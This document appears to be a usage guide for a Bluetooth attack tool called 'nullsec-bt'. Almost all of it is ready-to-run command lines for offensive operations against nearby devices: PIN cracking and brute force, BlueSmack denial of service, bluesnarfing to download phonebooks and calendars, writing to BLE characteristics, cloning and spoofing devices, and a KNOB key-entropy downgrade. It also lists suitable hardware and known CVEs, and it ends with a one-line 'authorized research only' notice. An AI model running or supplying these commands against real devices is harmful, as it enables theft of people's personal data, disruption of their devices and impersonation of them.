# NullSec Bluetooth Attack Guide

## Reconnaissance

### Device Discovery
```bash
# Classic Bluetooth scan
nullsec-bt --scan --classic

# BLE scan
nullsec-bt --scan --ble --timeout 30

# Continuous monitoring
nullsec-bt --monitor --interface hci0
```

### Service Enumeration
```bash
# SDP query
nullsec-bt --sdp --target AA:BB:CC:DD:EE:FF

# GATT enumeration (BLE)
nullsec-bt --gatt --target AA:BB:CC:DD:EE:FF
```

## Classic Bluetooth Attacks

### PIN Cracking
```bash
# Offline PIN cracking
nullsec-bt --crack-pin --capture btbb.pcap

# Online brute force (slow)
nullsec-bt --bruteforce-pin --target AA:BB:CC:DD:EE:FF
```

### BlueSmack (DoS)
```bash
nullsec-bt --bluesmack --target AA:BB:CC:DD:EE:FF --size 10000
```

### Bluesnarfing
```bash
# Download phonebook
nullsec-bt --snarf --target AA:BB:CC:DD:EE:FF --obex

# Download calendar
nullsec-bt --snarf --target AA:BB:CC:DD:EE:FF --calendar
```

## BLE Attacks

### GATT Attacks
```bash
# Read all characteristics
nullsec-bt --ble-read --target AA:BB:CC:DD:EE:FF

# Write to characteristic
nullsec-bt --ble-write --target AA:BB:CC:DD:EE:FF --handle 0x0025 --data "deadbeef"
```

### BLE Spoofing
```bash
# Clone device
nullsec-bt --ble-clone --target AA:BB:CC:DD:EE:FF

# Advertise as target
nullsec-bt --ble-advertise --name "Fitness Tracker" --services 180d,180f
```

### KNOB Attack
```bash
nullsec-bt --knob --target AA:BB:CC:DD:EE:FF --entropy 1
```

## Hardware

| Device | Classic | BLE | TX |
|--------|---------|-----|-----|
| Ubertooth One | ✓ | ✓ | ✓ |
| CSR USB dongle | ✓ | ✓ | ✓ |
| nRF52840 dongle | ✗ | ✓ | ✓ |
| ESP32 | ✓ | ✓ | ✓ |

## Common Vulnerabilities

- CVE-2020-0022: BlueFrag RCE
- CVE-2019-9506: KNOB attack
- CVE-2017-0781: BlueBorne
- SweynTooth (BLE)

## Legal Notice
For authorized security research only.
